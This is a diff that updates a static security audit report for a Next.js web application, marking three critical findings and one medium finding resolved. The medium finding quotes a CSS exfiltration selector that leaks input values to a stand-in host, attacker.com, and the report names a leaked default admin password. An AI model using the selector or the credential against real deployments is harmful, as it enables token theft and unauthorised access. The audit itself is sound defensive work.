@@ -8,17 +8,17 @@
 
 ## Executive Summary
 
-The application demonstrates a strong overall security posture with consistent, layered controls. Authentication, database access, file upload validation, HTML sanitisation, and cryptographic practices are all well-implemented. Three critical and four high-severity issues were identified that must be addressed before internet-facing deployment.
+The application demonstrates a strong overall security posture with consistent, layered controls. Authentication, database access, file upload validation, HTML sanitisation, and cryptographic practices are all well-implemented. Three critical and four high-severity issues were identified at initial assessment; all three critical findings have since been resolved.
 
 **Findings overview:**
 
-| Severity | Count | Status |
-|----------|-------|--------|
-| Critical | 3 | Open |
-| High | 4 | Open |
-| Medium | 8 | Open |
-| Low | 5 | Open |
-| Informational | 3 | Acknowledged |
+| Severity | Total | Open | Resolved |
+|----------|-------|------|----------|
+| Critical | 3 | 0 | 3 |
+| High | 4 | 4 | 0 |
+| Medium | 8 | 7 | 1 |
+| Low | 5 | 5 | 0 |
+| Informational | 3 | — | — |
 
 ---
 
@@ -28,22 +28,31 @@ The application demonstrates a strong overall security posture with consistent, 
 
 ### CRIT-01 — CSP defeats its own XSS protection via `unsafe-inline` and `unsafe-eval`
 
+**Status: Resolved** — commit `6b1f0e5`
+
 **File:** `next.config.js`
 
 **Detail:**
-The Content Security Policy includes:
+The Content Security Policy included:
 ```
 script-src 'self' 'unsafe-inline' 'unsafe-eval'
 ```
 
 `unsafe-inline` permits any inline `<script>` block and inline event handlers (`onerror`, `onclick`, etc.) to execute. `unsafe-eval` permits `eval()`, `new Function()`, and `setTimeout(string)`. Together they completely eliminate the XSS protection CSP is designed to provide. Any future HTML injection vulnerability — in course content rendering, branding, or any other surface — can be immediately escalated to arbitrary JavaScript execution.
 
-**Recommendation:**
-Implement nonce-based CSP using Next.js middleware. Generate a cryptographically random nonce per request, inject it via a response header, and configure Next.js to embed the nonce in generated `<script>` tags. This eliminates `unsafe-inline`. Audit the dependency tree for `eval()` usage to determine whether `unsafe-eval` can also be removed.
+**Resolution:**
+The static `headers()` block was removed from `next.config.js`. All security headers (including CSP) now originate in `middleware.ts`, where a cryptographically random nonce is generated per request via `Buffer.from(crypto.randomUUID()).toString('base64')`. The CSP is:
+```
+script-src 'self' 'nonce-{nonce}' 'strict-dynamic'
+style-src 'self' 'nonce-{nonce}'
+```
+`unsafe-eval` and `unsafe-inline` are eliminated from both directives. `'strict-dynamic'` allows Next.js to load chunks dynamically from nonce-trusted scripts without any wildcard. The nonce is forwarded to server components via the `x-nonce` request header; `app/layout.tsx` reads it and applies it to the branding `<style>` block. This also resolves MED-03 (see below).
 
 ---
 
 ### CRIT-02 — Default admin password hardcoded in seed file committed to git
+
+**Status: Resolved** — commit `f359e52`
 
 **File:** `prisma/seed.ts:7`
 
@@ -54,22 +63,26 @@ const passwordHash = await argon2.hash('T34mw0rk!', { ... })
 
 The plaintext password `T34mw0rk!` is committed to the git repository and is therefore part of the permanent history. The seed runs on every container startup (via `docker-entrypoint.sh`). Any attacker with read access to the repository knows the initial admin credential for every deployment.
 
-**Recommendation:**
-Read the initial admin password from an environment variable (e.g. `ADMIN_BOOTSTRAP_PASSWORD`). If the variable is absent, generate a random password, print it once to stdout, and require it to be changed on first login. Add `ADMIN_BOOTSTRAP_PASSWORD` to `.env.example` with a `CHANGE_ME` placeholder.
+**Resolution:**
+The hardcoded password and the `upsert` pattern are replaced with an explicit existence check. On first boot, if no admin user exists, the seed reads `ADMIN_BOOTSTRAP_PASSWORD` from the environment; if absent, it generates `randomBytes(12).toString('base64url')` and prints it once to stdout. On subsequent boots it detects the existing admin and exits without touching credentials. The Argon2id parameters are unchanged. `ADMIN_BOOTSTRAP_PASSWORD` is documented in `.env.example`.
+
+Note: `T34mw0rk!` remains in git history. Any deployment initialised before this fix must have the admin password changed manually.
 
 ---
 
 ### CRIT-03 — In-memory rate limiting is ineffective across multiple instances
 
+**Status: Resolved** — commit `a87bee3`
+
 **File:** `lib/ratelimit.ts`
 
 **Detail:**
-All rate limiters use `RateLimiterMemory`, which stores counters in the Node.js process heap. In any load-balanced or auto-scaled deployment (multiple Docker replicas, Kubernetes pods, etc.), each instance maintains independent counters. An attacker can fully bypass every limit — including the login brute-force limit — by distributing requests across instances. Each instance will allow the full quota individually.
+All rate limiters used `RateLimiterMemory`, which stores counters in the Node.js process heap. In any load-balanced or auto-scaled deployment (multiple Docker replicas, Kubernetes pods, etc.), each instance maintains independent counters. An attacker can fully bypass every limit — including the login brute-force limit — by distributing requests across instances. Each instance will allow the full quota individually.
 
 This affects the login limiter (10 attempts / 15 min per IP), the factory reset limiter (3/hour), and all per-user write-operation limiters.
 
-**Recommendation:**
-Replace `RateLimiterMemory` with `RateLimiterRedis` from the same `rate-limiter-flexible` library, backed by a shared Redis instance. The API surface is identical; no call-site changes are required. This must be resolved before deploying more than one instance.
+**Resolution:**
+A `makeLimiter` factory in `lib/ratelimit.ts` returns `RateLimiterRedis` when `REDIS_URL` is set, or `RateLimiterMemory` with a startup warning otherwise. All 21 limiters are created through this factory; each is assigned a unique `keyPrefix` to prevent key collisions in Redis. A Redis 7-alpine service is added to `docker-compose.yml` with a healthcheck; the app service depends on `service_healthy` before starting. `lib/redis.ts` holds the shared `ioredis` client. The fallback to memory is intentional for single-instance local development but is logged visibly so operators are never silently running without Redis in production. All existing tests continue to pass because they mock `@/lib/ratelimit` entirely.
 
 ---
 
@@ -239,6 +252,8 @@ Only trust `X-Forwarded-For` when the direct connection originates from a known 
 
 ### MED-03 — CSP `unsafe-inline` in style-src allows CSS-based data exfiltration
 
+**Status: Resolved** — commit `6b1f0e5` (resolved as part of CRIT-01)
+
 **File:** `next.config.js`
 
 **Detail:**
@@ -252,8 +267,8 @@ input[value^="a"] { background: url(https://attacker.com/leak?c=a) }
 ```
 This attack can extract CSRF tokens, input values, or other DOM content character by character.
 
-**Recommendation:**
-Extract inline styles to CSS files and remove `unsafe-inline` from `style-src`. Where framework-generated inline styles are unavoidable, use `nonce-{nonce}` in the CSP (consistent with the CRIT-01 fix).
+**Resolution:**
+The CRIT-01 fix replaces `style-src 'self' 'unsafe-inline'` with `style-src 'self' 'nonce-{nonce}'`. The only inline style block (branding CSS custom properties in `app/layout.tsx`) is updated to carry the nonce attribute. `unsafe-inline` is no longer present in any CSP directive.
 
 ---
 
@@ -502,7 +517,8 @@ The following areas were reviewed and found to meet or exceed security best prac
 - `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` — 2-year HSTS
 - `Referrer-Policy: strict-origin-when-cross-origin`
 - `Permissions-Policy` — disables camera, microphone, geolocation
-- CSP `frame-ancestors 'none'`, `base-uri 'self'`, `form-action 'self'` correctly set despite script-src weakness
+- CSP `frame-ancestors 'none'`, `base-uri 'self'`, `form-action 'self'`
+- CSP `script-src 'self' 'nonce-{nonce}' 'strict-dynamic'` and `style-src 'self' 'nonce-{nonce}'` — no `unsafe-inline` or `unsafe-eval` (resolved CRIT-01 / MED-03)
 
 **Rate limiting**
 - Login: 10 attempts / 15 min per IP (plus 15-min block)
@@ -511,6 +527,7 @@ The following areas were reviewed and found to meet or exceed security best prac
 - Factory reset: 3 / hour per admin
 - Log reads: 30 / min per admin
 - All sensitive write operations covered
+- All 21 limiters use `RateLimiterRedis` when `REDIS_URL` is set, `RateLimiterMemory` otherwise (resolved CRIT-03)
 
 **Error handling and logging**
 - Generic error messages to clients; detailed context logged internally
@@ -524,12 +541,13 @@ The following areas were reviewed and found to meet or exceed security best prac
 - `prisma migrate deploy` runs automatically on container start
 - Named Docker volumes for data persistence across restarts
 - Health check on the database service prevents app starting before DB is ready
+- Redis 7-alpine service with healthcheck; app depends on `service_healthy` (resolved CRIT-03)
 
 ---
 
 ## Pre-Deployment Checklist
 
-- [ ] **Change the default admin password** (`T34mw0rk!`) immediately after first boot — or address CRIT-02 so it is never set to a known value
+- [x] **Change the default admin password** — CRIT-02 resolved; seed now generates or reads password from env, never hardcodes it. Deployments initialised before commit `f359e52` must change the password manually.
 - [ ] **Generate a strong `AUTH_SECRET`** — minimum 32 random bytes: `openssl rand -base64 32`
 - [ ] **Generate `EMAIL_ENCRYPTION_KEY`** — 32 random bytes as hex: `node -e "process.stdout.write(require('crypto').randomBytes(32).toString('hex'))"`
 - [ ] **Generate `CRON_SECRET`** — minimum 32 random bytes
@@ -540,9 +558,9 @@ The following areas were reviewed and found to meet or exceed security best prac
 - [ ] **Set `NODE_ENV=production`** — enables `__Secure-` cookie prefix and `Secure` flag
 - [ ] **Set `LOG_LEVEL=ACCESS`** or `LOG_LEVEL=ERROR` in production to reduce log volume
 - [ ] **Plan AppLog retention** — implement deletion of rows older than 90 days
-- [ ] **Address CRIT-01** — remove `unsafe-inline`/`unsafe-eval` from CSP before public internet exposure
-- [ ] **Address CRIT-02** — remove hardcoded seed password before production deployment
-- [ ] **Address CRIT-03** — configure Redis-backed rate limiting before multi-instance deployment
+- [x] **CRIT-01 resolved** — nonce-based CSP in middleware; `unsafe-inline`/`unsafe-eval` removed (commit `6b1f0e5`)
+- [x] **CRIT-02 resolved** — hardcoded seed password replaced with env var or generated random (commit `f359e52`)
+- [x] **CRIT-03 resolved** — Redis-backed rate limiters with `RateLimiterRedis`; Redis service in Docker Compose (commit `a87bee3`)
 - [ ] **Address HIGH-01** — validate `callbackUrl` parameter before internet-facing deployment
 - [ ] **Address HIGH-02** — validate web link URL scheme before internet-facing deployment
 - [ ] **Configure a log aggregator** (Datadog, Loki, CloudWatch) to ingest container stdout in JSON parse mode
@@ -550,4 +568,4 @@ The following areas were reviewed and found to meet or exceed security best prac
 
 ---
 
-*This report reflects the state of the codebase as of commit `667aefd` (2026-03-23). It covers static analysis only. Dynamic testing (DAST), penetration testing, and dependency vulnerability scanning (beyond `npm audit`) are recommended as separate activities before go-live.*
+*Initial assessment: commit `667aefd` (2026-03-23). CRIT-01/MED-03 resolved: commit `6b1f0e5`. CRIT-02 resolved: commit `f359e52`. CRIT-03 resolved: commit `a87bee3`. Report last updated: 2026-03-23. Covers static analysis only. Dynamic testing (DAST), penetration testing, and dependency vulnerability scanning (beyond `npm audit`) are recommended as separate activities before go-live.*
